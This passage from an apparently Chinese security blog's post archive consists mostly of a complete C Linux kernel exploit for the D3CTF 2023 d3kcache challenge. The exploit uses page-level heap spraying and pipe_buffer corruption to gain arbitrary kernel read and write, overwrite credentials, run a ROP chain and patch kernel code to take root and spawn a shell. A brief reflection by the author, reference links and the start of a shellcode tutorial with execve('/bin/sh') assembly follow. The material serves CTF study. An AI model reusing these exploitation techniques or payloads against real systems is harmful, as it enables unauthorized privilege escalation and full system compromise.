sizeof(edit), &quot;0 %d 1&quot;, getuid());        write(tmp_fd, edit, strlen(edit));        close(tmp_fd);        tmp_fd = open(&quot;/proc/self/gid_map&quot;, O_WRONLY);        snprintf(edit, sizeof(edit), &quot;0 %d 1&quot;, getgid());        write(tmp_fd, edit, strlen(edit));        close(tmp_fd);        while (1)        &#123;            read(cmd_pipe_req[0], &amp;req, sizeof(req));            if (req.cmd == 0)            &#123;                ret = create_socket_and_alloc_pages(req.size, req.nr);                socket_fd[req.idx] = ret;            &#125;            else if (req.cmd == 1)            &#123;                ret = close(socket_fd[req.idx]);            &#125;            else if (req.cmd == 2)            &#123;                exit(0);            &#125;            write(cmd_pipe_reply[1], &amp;ret, sizeof(ret));        &#125;    &#125;    int pgv_1page_start_idx = 0;    int pgv_4pages_start_idx = PGV_4PAGES_START_IDX;    int pgv_8pages_start_idx = PGV_8PAGES_START_IDX;    &#123;        puts(&quot;[*] spray pgv order-0 pages...&quot;);        for (int i = 0; i &lt; PGV_1PAGE_SPRAY_NUM; i++)        &#123;            if (alloc_page(i, 0x1000, 1) &lt; 0)            &#123;                printf(&quot;[x] failed to create %d socket for pages spraying!\\n&quot;, i);                errExit(&quot;Faild to spray pgv!&quot;);            &#125;        &#125;        puts(&quot;[*] spray pgv order-2 pages...&quot;);        for (int i = 0; i &lt; PGV_4PAGES_SPRAY_NUM; i++)        &#123;            if (alloc_page(PGV_4PAGES_START_IDX + i, 0x1000 * 4, 1) &lt; 0)            &#123;                printf(&quot;[x] failed to create %d socket for pages spraying!\\n&quot;, i);                errExit(&quot;Faild to spray pgv!&quot;);            &#125;        &#125;        puts(&quot;[*] spray pgv order-3 pages...&quot;);        for (int i = 0; i &lt; PGV_8PAGES_SPRAY_NUM; i++)        &#123;            if (i % 19 == 0)            &#123;                free_page(pgv_4pages_start_idx++);            &#125;            if (i % 21 == 0)            &#123;                free_page(pgv_1page_start_idx += 2);            &#125;            if (i % 512 == 0)            &#123;                free_page(pgv_1page_start_idx += 2);            &#125;            if (alloc_page(PGV_8PAGES_START_IDX + i, 0x1000 * 8, 1) &lt; 0)            &#123;                printf(&quot;[x] failed to create %d socket for pages spraying!\\n&quot;, i);                errExit(&quot;Faild to spray pgv!&quot;);            &#125;        &#125;    &#125;    int victim_pid = -1;    int orig_pid = -1;    &#123;        puts(&quot;[*] spray pipe_buffer...&quot;);        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (pipe(pipe_fd[i]) &lt; 0)            &#123;                printf(&quot;[x] failed to alloc %d pipe!&quot;, i);                errExit(&quot;FAILED to create pipe!&quot;);            &#125;        &#125;        puts(&quot;[*] exetend pipe_buffer...&quot;);        for (int i = 0; i &lt; (PIPE_SPRAY_NUM / 2); i++)        &#123;            if (i % 8 == 0)            &#123;                free_page(pgv_8pages_start_idx++);            &#125;            if (fcntl(pipe_fd[0 + i][1], F_SETPIPE_SZ, 0x1000 * 64) &lt; 0)            &#123;                printf(&quot;[x] failed to extend %d pipe!\\n&quot;, 0 + i);                errExit(&quot;FAILED to extend pipe!&quot;);            &#125;        &#125;        puts(&quot;[*] spray vulnerable 2k obj...&quot;);        free_page(pgv_8pages_start_idx++);        for (int i = 0; i &lt; 0x10; i++)        &#123;            create(i, 8, &quot;0x196082&quot;);        &#125;        puts(&quot;[*] exetend pipe_buffer...&quot;);        for (int i = 0; i &lt; (PIPE_SPRAY_NUM / 2); i++)        &#123;            if (i % 8 == 0)            &#123;                free_page(pgv_8pages_start_idx++);            &#125;            if (fcntl(pipe_fd[(PIPE_SPRAY_NUM / 2) + i][1], F_SETPIPE_SZ, 0x1000 * 64) &lt; 0)            &#123;                printf(&quot;[x] failed to extend %d pipe!\\n&quot;, (PIPE_SPRAY_NUM / 2) + i);                errExit(&quot;FAILED to extend pipe!&quot;);            &#125;        &#125;        puts(&quot;[*] allocating pipe pages...&quot;);        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            write(pipe_fd[i][1], &quot;0x196082&quot;, 8);            write(pipe_fd[i][1], &amp;i, sizeof(int));            write(pipe_fd[i][1], &amp;i, sizeof(int));            write(pipe_fd[i][1], &amp;i, sizeof(int));            write(pipe_fd[i][1], &quot;0x196082&quot;, 8);            write(pipe_fd[i][1], &quot;0x196082&quot;, 8);        &#125;        puts(&quot;[*] trigerring cross-cache off-by-null...&quot;);        show(0, 0, buf);        memset(buf, 0x61, 0x800);        for (int i = 0; i &lt; 0x10; i++)        &#123;            edit(i, 0x7f8, buf);        &#125;        show(0, 0, buf);        puts(&quot;[*] checking for corruption...&quot;);        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            char str_flag[0x10];            int nr;            memset(str_flag, &#x27;\\0&#x27;, sizeof(str_flag));            read(pipe_fd[i][0], str_flag, 8);            read(pipe_fd[i][0], &amp;nr, sizeof(int));            if (!strcmp(str_flag, &quot;0x196082&quot;) &amp;&amp; nr != i)            &#123;                orig_pid = nr;                victim_pid = i;                printf(&quot;\\033[32m\\033[1m[+] Found victim: \\033[0m%d &quot;                       &quot;\\033[32m\\033[1m, orig: \\033[0m%d\\n\\n&quot;,                       victim_pid, orig_pid);                break;            &#125;        &#125;        if (victim_pid == -1)        &#123;            errExit(&quot;FAILED to corrupt pipe_buffer!&quot;);        &#125;    &#125;    int snd_orig_pid = -1;    int snd_vicitm_pid = -1;    struct pipe_buffer info_pipe_buf;    &#123;        size_t snd_pipe_sz = 0x1000 * (SND_PIPE_BUF_SZ / sizeof(struct pipe_buffer));        memset(buf, &#x27;\\0&#x27;, sizeof(buf));        write(pipe_fd[victim_pid][1], buf, SND_PIPE_BUF_SZ * 2 - 24 - 3 * sizeof(int));        puts(&quot;[*] free original pipe...&quot;);        close(pipe_fd[orig_pid][0]);        close(pipe_fd[orig_pid][1]);        puts(&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;);        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (i == orig_pid || i == victim_pid)            &#123;                continue;            &#125;            if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, snd_pipe_sz) &lt; 0)            &#123;                printf(&quot;[x] failed to resize %d pipe!\\n&quot;, i);                errExit(&quot;FAILED to re-alloc pipe_buffer!&quot;);            &#125;        &#125;        read(pipe_fd[victim_pid][0], buf, SND_PIPE_BUF_SZ - 8 - sizeof(int));        read(pipe_fd[victim_pid][0], &amp;info_pipe_buf, sizeof(info_pipe_buf));        printf(&quot;\\033[34m\\033[1m[?] info_pipe_buf-&gt;page: \\033[0m%p\\n&quot;               &quot;\\033[34m\\033[1m[?] info_pipe_buf-&gt;ops: \\033[0m%p\\n&quot;,               info_pipe_buf.page, info_pipe_buf.ops);        if ((size_t)info_pipe_buf.page &lt; 0xffff000000000000 || (size_t)info_pipe_buf.ops &lt; 0xffffffff81000000)        &#123;            errExit(&quot;FAILED to re-hit victim page!&quot;);        &#125;        puts(&quot;\\033[32m\\033[1m[+] Successfully to hit the UAF page!\\033[0m&quot;);        printf(&quot;\\033[32m\\033[1m[+] Got page leak:\\033[0m %p\\n&quot;, info_pipe_buf.page);        puts(&quot;&quot;);        puts(&quot;[*] construct a second-level uaf pipe page...&quot;);        info_pipe_buf.page = (struct page *)((size_t)info_pipe_buf.page + 0x40);        write(pipe_fd[victim_pid][1], &amp;info_pipe_buf, sizeof(info_pipe_buf));        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            int nr;            if (i == orig_pid || i == victim_pid)            &#123;                continue;            &#125;            read(pipe_fd[i][0], &amp;nr, sizeof(nr));            if (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr)            &#123;                snd_orig_pid = nr;                snd_vicitm_pid = i;                printf(&quot;\\033[32m\\033[1m[+] Found second-level victim: \\033[0m%d &quot;                       &quot;\\033[32m\\033[1m, orig: \\033[0m%d\\n&quot;,                       snd_vicitm_pid, snd_orig_pid);                break;            &#125;        &#125;        if (snd_vicitm_pid == -1)        &#123;            errExit(&quot;FAILED to corrupt second-level pipe_buffer!&quot;);        &#125;    &#125;    &#123;        size_t trd_pipe_sz = 0x1000 * (TRD_PIPE_BUF_SZ / sizeof(struct pipe_buffer));        struct pipe_buffer evil_pipe_buf;        struct page *page_ptr;        memset(buf, 0, sizeof(buf));        write(pipe_fd[snd_vicitm_pid][1], buf, TRD_PIPE_BUF_SZ - 24 - 3 * sizeof(int));        puts(&quot;[*] free second-level original pipe...&quot;);        close(pipe_fd[snd_orig_pid][0]);        close(pipe_fd[snd_orig_pid][1]);        puts(&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;);        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)            &#123;                continue;            &#125;            if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, trd_pipe_sz) &lt; 0)            &#123;                printf(&quot;[x] failed to resize %d pipe!\\n&quot;, i);                errExit(&quot;FAILED to re-alloc pipe_buffer!&quot;);            &#125;        &#125;        puts(&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;);        evil_pipe_buf.page = info_pipe_buf.page;        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;        evil_pipe_buf.ops = info_pipe_buf.ops;        evil_pipe_buf.flags = info_pipe_buf.flags;        evil_pipe_buf.private = info_pipe_buf.private;        write(pipe_fd[snd_vicitm_pid][1], &amp;evil_pipe_buf, sizeof(evil_pipe_buf));        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid)            &#123;                continue;            &#125;            read(pipe_fd[i][0], &amp;page_ptr, sizeof(page_ptr));            if (page_ptr == evil_pipe_buf.page)            &#123;                self_2nd_pipe_pid = i;                printf(&quot;\\033[32m\\033[1m[+] Found self-writing pipe: \\033[0m%d\\n&quot;,                       self_2nd_pipe_pid);                break;            &#125;        &#125;        if (self_2nd_pipe_pid == -1)        &#123;            errExit(&quot;FAILED to build a self-writing pipe!&quot;);        &#125;        puts(&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;);        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;        write(pipe_fd[snd_vicitm_pid][1], buf, TRD_PIPE_BUF_SZ - sizeof(evil_pipe_buf));        write(pipe_fd[snd_vicitm_pid][1], &amp;evil_pipe_buf, sizeof(evil_pipe_buf));        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid)            &#123;                continue;            &#125;            read(pipe_fd[i][0], &amp;page_ptr, sizeof(page_ptr));            if (page_ptr == evil_pipe_buf.page)            &#123;                self_3rd_pipe_pid = i;                printf(&quot;\\033[32m\\033[1m[+] Found another self-writing pipe:\\033[0m&quot;                       &quot;%d\\n&quot;,                       self_3rd_pipe_pid);                break;            &#125;        &#125;        if (self_3rd_pipe_pid == -1)        &#123;            errExit(&quot;FAILED to build a self-writing pipe!&quot;);        &#125;        puts(&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;);        evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;        evil_pipe_buf.len = TRD_PIPE_BUF_SZ;        write(pipe_fd[snd_vicitm_pid][1], buf, TRD_PIPE_BUF_SZ - sizeof(evil_pipe_buf));        write(pipe_fd[snd_vicitm_pid][1], &amp;evil_pipe_buf, sizeof(evil_pipe_buf));        for (int i = 0; i &lt; PIPE_SPRAY_NUM; i++)        &#123;            if (i == orig_pid || i == victim_pid || i == snd_orig_pid || i == snd_vicitm_pid || i == self_2nd_pipe_pid || i == self_3rd_pipe_pid)            &#123;                continue;            &#125;            read(pipe_fd[i][0], &amp;page_ptr, sizeof(page_ptr));            if (page_ptr == evil_pipe_buf.page)            &#123;                self_4th_pipe_pid = i;                printf(&quot;\\033[32m\\033[1m[+] Found another self-writing pipe:\\033[0m&quot;                       &quot;%d\\n&quot;,                       self_4th_pipe_pid);                break;            &#125;        &#125;        if (self_4th_pipe_pid == -1)        &#123;            errExit(&quot;FAILED to build a self-writing pipe!&quot;);        &#125;    &#125;    &#123;        puts(&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;);        memcpy(&amp;evil_2nd_buf, &amp;info_pipe_buf, sizeof(evil_2nd_buf));        memcpy(&amp;evil_3rd_buf, &amp;info_pipe_buf, sizeof(evil_3rd_buf));        memcpy(&amp;evil_4th_buf, &amp;info_pipe_buf, sizeof(evil_4th_buf));        evil_2nd_buf.offset = 0;        evil_2nd_buf.len = 0xff0;        evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * 3;        evil_3rd_buf.len = 0;        write(pipe_fd[self_4th_pipe_pid][1], &amp;evil_3rd_buf, sizeof(evil_3rd_buf));        evil_4th_buf.offset = TRD_PIPE_BUF_SZ;        evil_4th_buf.len = 0;    &#125;    &#123;        vmemmap_base = (size_t)info_pipe_buf.page &amp; 0xfffffffff0000000;        for (;;)        &#123;            arbitrary_read_by_pipe((struct page *)(vmemmap_base + 157 * 0x40), buf);            if (*(uint64_t *)buf &gt; 0xffffffff81000000 &amp;&amp; ((*(uint64_t *)buf &amp; 0xfff) == 0x070))            &#123;                kernel_base = *(uint64_t *)buf - 0x070;                kernel_offset = kernel_base - 0xffffffff81000000;                printf(&quot;\\033[32m\\033[1m[+] Found kernel base: \\033[0m0x%lx\\n&quot;                       &quot;\\033[32m\\033[1m[+] Kernel offset: \\033[0m0x%lx\\n&quot;,                       kernel_base, kernel_offset);                break;            &#125;            vmemmap_base -= 0x10000000;        &#125;        printf(&quot;\\033[32m\\033[1m[+] vmemmap_base:\\033[0m 0x%lx\\n\\n&quot;, vmemmap_base);    &#125;    uint64_t parent_task, current_task;    &#123;        puts(&quot;[*] Seeking task_struct in memory...&quot;);        uint64_t *comm_addr = 0;        uint64_t *point_buf = malloc(0x1000);        for (int i = 0; 1; i++)        &#123;            arbitrary_read_by_pipe((struct page *)(vmemmap_base + i * 0x40), point_buf);            comm_addr = memmem(point_buf, 0xf00, target, 0xf);            if (comm_addr &amp;&amp; (comm_addr[-2] &gt; 0xffff888000000000) &amp;&amp; (comm_addr[-3] &gt; 0xffff888000000000) &amp;&amp; (comm_addr[-57] &gt; 0xffff888000000000) &amp;&amp; (comm_addr[-56] &gt; 0xffff888000000000))            &#123;                parent_task = comm_addr[-57];                current_task = comm_addr[-50] - 2528;                page_offset_base = (comm_addr[-50] &amp; 0xfffffffffffff000) - i * 0x1000;                page_offset_base &amp;= 0xfffffffff0000000;                printf(&quot;\\033[32m\\033[1m[+] Found task_struct on page: \\033[0m%p\\n&quot;,                       (struct page *)(vmemmap_base + i * 0x40));                printf(&quot;\\033[32m\\033[1m[+] page_offset_base: \\033[0m0x%lx\\n&quot;,                       page_offset_base);                printf(&quot;\\033[34m\\033[1m[*] current task_struct&#x27;s addr: \\033[0m&quot;                       &quot;0x%lx\\n\\n&quot;,                       current_task);                break;            &#125;        &#125;    &#125;    int command = 0;    uint64_t stack_addr;    size_t *tsk_buf;    size_t *mm_struct_buf;    uint64_t mm_struct_addr;    uint64_t mm_struct_page;    uint64_t pgd_addr;    switch (command)    &#123;    case 0:        puts(&quot;[*] Seeking for init_task...&quot;);        &#123;            uint64_t init_task;            uint64_t init_cred;            uint64_t init_nsproxy;            for (;;)            &#123;                size_t ptask_page_addr = direct_map_addr_to_page_addr(parent_task);                tsk_buf = (size_t *)((size_t)buf + (parent_task &amp; 0xfff));                arbitrary_read_by_pipe((struct page *)ptask_page_addr, buf);                arbitrary_read_by_pipe((struct page *)(ptask_page_addr + 0x40), &amp;buf[512 * 8]);                /* task_struct::real_parent */                if (parent_task == tsk_buf[309])                &#123;                    break;                &#125;                parent_task = tsk_buf[309];            &#125;            init_task = parent_task;            init_cred = tsk_buf[363];            init_nsproxy = tsk_buf[377];            printf(&quot;\\033[32m\\033[1m[+] Found init_task: \\033[0m0x%lx\\n&quot;, init_task);            printf(&quot;\\033[32m\\033[1m[+] Found init_cred: \\033[0m0x%lx\\n&quot;, init_cred);            printf(&quot;\\033[32m\\033[1m[+] Found init_nsproxy:\\033[0m0x%lx\\n&quot;, init_nsproxy);            /* now, changing the current task_struct to get the full root :) */            puts(&quot;[*] Escalating ROOT privilege now...&quot;);            size_t current_task_page = direct_map_addr_to_page_addr(current_task);            arbitrary_read_by_pipe((struct page *)current_task_page, buf);            arbitrary_read_by_pipe((struct page *)(current_task_page + 0x40), &amp;buf[512 * 8]);            tsk_buf = (size_t *)((size_t)buf + (current_task &amp; 0xfff));            tsk_buf[363] = init_cred;            tsk_buf[364] = init_cred;            tsk_buf[377] = init_nsproxy;            arbitrary_write_by_pipe((struct page *)current_task_page, buf, 0xff0);            arbitrary_write_by_pipe((struct page *)(current_task_page + 0x40),                                    &amp;buf[512 * 8], 0xff0);            puts(&quot;[+] Done.\\n&quot;);            puts(&quot;[*] checking for root...&quot;);            get_shell();        &#125;        break;    case 1:        puts(&quot;[*] Reading current task_struct...&quot;);        &#123;            size_t current_task_page = direct_map_addr_to_page_addr(current_task);            arbitrary_read_by_pipe((struct page *)current_task_page, buf);            arbitrary_read_by_pipe((struct page *)(current_task_page + 0x40), &amp;buf[512 * 8]);            tsk_buf = (size_t *)((size_t)buf + (current_task &amp; 0xfff));            stack_addr = tsk_buf[4];            mm_struct_addr = tsk_buf[292];            printf(&quot;\\033[34m\\033[1m[*] kernel stack&#x27;s addr:\\033[0m0x%lx\\n&quot;, stack_addr);            printf(&quot;\\033[34m\\033[1m[*] mm_struct&#x27;s addr:\\033[0m0x%lx\\n&quot;, mm_struct_addr);            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);            printf(&quot;\\033[34m\\033[1m[*] mm_struct&#x27;s page:\\033[0m0x%lx\\n&quot;, mm_struct_page);            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);            arbitrary_read_by_pipe((struct page *)(mm_struct_page + 0x40), &amp;buf[512 * 8]);            mm_struct_buf = (size_t *)((size_t)buf + (mm_struct_addr &amp; 0xfff));            pgd_addr = mm_struct_buf[9];            printf(&quot;\\033[32m\\033[1m[+] Got kernel page table of current task:\\033[0m&quot;                   &quot;0x%lx\\n\\n&quot;,                   pgd_addr);        &#125;        &#123;            puts(&quot;[*] Reading page table...&quot;);            size_t rop[0x1000];            size_t idx = 0;            uint64_t stack_addr_another;            size_t pud_addr, pmd_addr, pte_addr, pte_val;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pgd_addr), buf);            pud_addr = (*(size_t *)((size_t *)buf + PGD_ENTRY(stack_addr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            pud_addr += page_offset_base;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pud_addr), buf);            pmd_addr = (*(size_t *)((size_t *)buf + PUD_ENTRY(stack_addr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            pmd_addr += page_offset_base;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pmd_addr), buf);            pte_addr = (*(size_t *)((size_t *)buf + PMD_ENTRY(stack_addr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            pte_addr += page_offset_base;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pte_addr), buf);            pte_val = (*(size_t *)((size_t *)buf + PTE_ENTRY(stack_addr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            stack_addr_another = pte_val;            stack_addr_another &amp;= (~PAGE_ATTR_NX);            stack_addr_another += page_offset_base;            printf(&quot;\\033[32m\\033[1m[+] Got another virt addr of kernel stack: \\033[0m&quot;                   &quot;0x%lx\\n\\n&quot;,                   stack_addr_another);            for (int i = 0; i &lt; ((0x1000 - 0x100) / 8); i++)            &#123;                rop[idx++] = RET + kernel_offset;            &#125;            rop[idx++] = POP_RDI_RET + kernel_offset;            rop[idx++] = INIT_CRED + kernel_offset;            rop[idx++] = COMMIT_CREDS + kernel_offset;            rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 54 + kernel_offset;            rop[idx++] = *(size_t *)&quot;0x196082&quot;;            rop[idx++] = *(size_t *)&quot;0x196082&quot;;            rop[idx++] = (size_t)get_shell;            rop[idx++] = user_cs;            rop[idx++] = user_rflags;            rop[idx++] = user_sp;            rop[idx++] = user_ss;            uint64_t stack_page = direct_map_addr_to_page_addr(stack_addr_another);            puts(&quot;[*] Hijacking current task&#x27;s stack...&quot;);            sleep(5);            arbitrary_write_by_pipe((struct page *)(stack_page + 0x40 * 3), rop, 0xff0);        &#125;    case 2:        puts(&quot;[*] Reading current task_struct...&quot;);        &#123;            size_t current_task_page = direct_map_addr_to_page_addr(current_task);            arbitrary_read_by_pipe((struct page *)current_task_page, buf);            arbitrary_read_by_pipe((struct page *)(current_task_page + 0x40), &amp;buf[512 * 8]);            tsk_buf = (size_t *)((size_t)buf + (current_task &amp; 0xfff));            stack_addr = tsk_buf[4];            mm_struct_addr = tsk_buf[292];            printf(&quot;\\033[34m\\033[1m[*] kernel stack&#x27;s addr:\\033[0m0x%lx\\n&quot;, stack_addr);            printf(&quot;\\033[34m\\033[1m[*] mm_struct&#x27;s addr:\\033[0m0x%lx\\n&quot;, mm_struct_addr);            mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);            printf(&quot;\\033[34m\\033[1m[*] mm_struct&#x27;s page:\\033[0m0x%lx\\n&quot;, mm_struct_page);            arbitrary_read_by_pipe((struct page *)mm_struct_page, buf);            arbitrary_read_by_pipe((struct page *)(mm_struct_page + 0x40), &amp;buf[512 * 8]);            mm_struct_buf = (size_t *)((size_t)buf + (mm_struct_addr &amp; 0xfff));            pgd_addr = mm_struct_buf[9];            printf(&quot;\\033[32m\\033[1m[+] Got kernel page table of current task:\\033[0m&quot;                   &quot;0x%lx\\n\\n&quot;,                   pgd_addr);        &#125;        &#123;            char *kcode_map;            size_t dst_paddr, dst_vaddr;            kcode_map = mmap((void *)0x114514000, 0x2000, PROT_READ | PROT_WRITE,                             MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);            if (!kcode_map)            &#123;                errExit(&quot;FAILED to create mmap area!&quot;);            &#125;            for (int i = 0; i &lt; 8; i++)            &#123;                kcode_map[i] = &quot;0x196082&quot;[i];                kcode_map[i + 0x1000] = &quot;0x196082&quot;[i];            &#125;            dst_vaddr = NS_CAPABLE_SETID + kernel_offset;            printf(&quot;\\033[34m\\033[1m[*] vaddr of ns_capable_setid is: \\033[0m0x%lx\\n&quot;, dst_vaddr);            size_t pud_addr, pmd_addr;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pgd_addr), buf);            pud_addr = (*(size_t *)((size_t *)buf + PGD_ENTRY(dst_vaddr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            pud_addr += page_offset_base;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pud_addr), buf);            pmd_addr = (*(size_t *)((size_t *)buf + PUD_ENTRY(dst_vaddr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            pmd_addr += page_offset_base;            arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pmd_addr), buf);            dst_paddr = (*(size_t *)((size_t *)buf + PMD_ENTRY(dst_vaddr)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);            dst_paddr += 0x1000 * PTE_ENTRY(dst_vaddr);            printf(&quot;\\033[32m\\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \\033[0m&quot;                   &quot;0x%lx\\n\\n&quot;,                   dst_paddr);            size_t pte_addr;            &#123;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pgd_addr), buf);                pud_addr = (*(size_t *)((size_t *)buf + PGD_ENTRY(0x114514000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pud_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pud_addr), buf);                pmd_addr = (*(size_t *)((size_t *)buf + PUD_ENTRY(0x114514000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pmd_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pmd_addr), buf);                pte_addr = (*(size_t *)((size_t *)buf + PMD_ENTRY(0x114514000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pte_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pte_addr), buf);                *(size_t *)((size_t *)buf + PTE_ENTRY(0x114514000)) = dst_paddr | 0x8000000000000867;                arbitrary_write_by_pipe((void *)direct_map_addr_to_page_addr(pte_addr), buf, 0xff0);            &#125;            &#123;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pgd_addr), buf);                pud_addr = (*(size_t *)((size_t *)buf + PGD_ENTRY(0x114514000 + 0x1000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pud_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pud_addr), buf);                pmd_addr = (*(size_t *)((size_t *)buf + PUD_ENTRY(0x114514000 + 0x1000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pmd_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pmd_addr), buf);                pte_addr = (*(size_t *)((size_t *)buf + PMD_ENTRY(0x114514000 + 0x1000)) &amp; (~0xfff)) &amp; (~PAGE_ATTR_NX);                pte_addr += page_offset_base;                arbitrary_read_by_pipe((void *)direct_map_addr_to_page_addr(pte_addr), buf);                *(size_t *)((size_t *)buf + PTE_ENTRY(0x114514000 + 0x1000)) = (dst_paddr + 0x1000) | 0x8000000000000867;                arbitrary_write_by_pipe((void *)direct_map_addr_to_page_addr(pte_addr), buf, 0xff0);            &#125;            puts(&quot;[*] Start overwriting kernel code segment...&quot;);            /**             * The setresuid() check for user&#x27;s permission by ns_capable_setid(),             * so we can just patch it to let it always return true :)             */            memset(kcode_map + (NS_CAPABLE_SETID &amp; 0xfff), &#x27;\\x90&#x27;, 0x40);            memcpy(kcode_map + (NS_CAPABLE_SETID &amp; 0xfff) + 0x40,                   &quot;\\xf3\\x0f\\x1e\\xfa&quot;                   &quot;H\\xc7\\xc0\\x01\\x00\\x00\\x00&quot;                   &quot;\\xc3&quot;,                   12);            puts(&quot;[*] trigger evil ns_capable_setid() in setresuid()...\\n&quot;);            sleep(5);            setresuid(0, 0, 0);            get_shell();        &#125;    &#125;    return 0;&#125;\n\n\n本人当时做的笨办法因为当时注意到存在off by null漏洞，第一反应就是利用msg_msg结构体来做这道题。属于是瞎猫碰到死耗子，我在没有考虑页级堆风水的情况下申请的msg_msg的order正好为3，也导致有一定的几率能够达到UAF的效果。自然，我的第一反应也是修改cred结构体，虽然能够成功找到但是成功率十分的低，每次调试需要手动跑二十多分钟，因为内存中有一大块存放着各种指针，导致无法继续往下搜索出现kernel panic，并且在改回普通用户权限后出现了这篇文章开头部分提到的io_uring的问题，所以也就放弃了这一方法。\n然而，因为当时不清楚CFI的作用又跑去改ops去了，调了半天发现永远会在最后一步造成panic，并且也没有找到可以用来实现栈迁移的gadget，所以这个方法也被放弃了。刚刚结束比赛看了NULL的wp之后就觉得自己是真的太蠢了，分明可以直接修改pipe_buffer了居然没有想到Dirty Pipe，虽然墨晚鸢佬说这不是最优解，但是是我唯一能够做出来的方法我居然没想到，我是真的蠢！！！\n\n参考链接：\n​    https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation\n​    https://elixir.bootlin.com/linux/v6.2.12/source\n","categories":["kernel-pwn"],"tags":["msg_msg","pipe_buffer","io_uring","页级堆风水"]},{"title":"shellcode","url":"/2021/11/24/shellcode/","content":"shellcode理解shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。\n在pwn的过程中我们的目标一般来说都是执行system(“/bin/sh”);其实shellcode也是较为类似的，只不过是一串机器码\nx86pwntools&gt;&gt;&gt; print(shellcraft.sh())    /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */    /* push b&#x27;/bin///sh\\x00&#x27; */    push 0x68    push 0x732f2f2f    push 0x6e69622f    mov ebx, esp    /* push argument array [&#x27;sh\\x00&#x27;] */    /* push &#x27;sh\\x00\\x00&#x27; */    push 0x1010101    xor dword ptr [esp], 0x1016972    xor ecx, ecx    push ecx /* null terminate */    push 4    pop ecx    add ecx, esp    push ecx /* &#x27;sh\\x00&#x27; */    mov ecx, esp    xor edx, edx    /* call execve() */    push SYS_execve /* 0xb */    pop eax    int 0x80&gt;&gt;&gt;\n\n可以很明显的看出来这个python默认生成的shellcode是32位的shellcode。\n32位的函数的参数不是栈里面的内容吗，为什么这里非要高寄存器呢？是因为这是系统调用的所以参数使用的是寄存器。\npython已经告诉我们上面的shellcode最终执行的是什么了\n\nexecve(path=’/bin///sh’, argv=[‘sh’], envp=0)\n32位的第一个参数为ebx，后面是ecx，edx\n\n&gt;&gt;&gt; print(len(asm(shellcraft.sh())))44\n\n自己编写x86 shellcode把上面的转化成十六进制代码之后求长度发现有44字节，确实是太长了，所以我们搞清楚本质就可以自己写shellcode了\n# 其实根据上面的可以看出来我们需要满足的条件有以下几条# ebx=/bin/sh# ecx=0# edx=0# eax=0xb     (系统调用号，后面有系统调用号很全的网站)# 